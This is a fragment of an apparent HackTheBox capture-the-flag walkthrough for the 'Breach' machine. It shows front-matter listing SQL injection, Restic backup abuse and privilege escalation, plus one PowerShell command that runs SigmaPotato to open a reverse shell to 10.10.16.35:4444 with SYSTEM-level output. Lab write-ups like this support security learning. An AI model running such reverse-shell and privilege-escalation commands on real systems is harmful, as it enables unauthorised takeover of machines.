...
excerpt: "Full walkthrough of the Breach HackTheBox machine, covering enumeration, SQL injection exploitation, Restic backup abuse, and privilege escalation."
---
...
```powershell
PS C:\Windows\system32> .\SigmaPotato.exe --revshell 10.10.16.35 4444
nt authority\system
```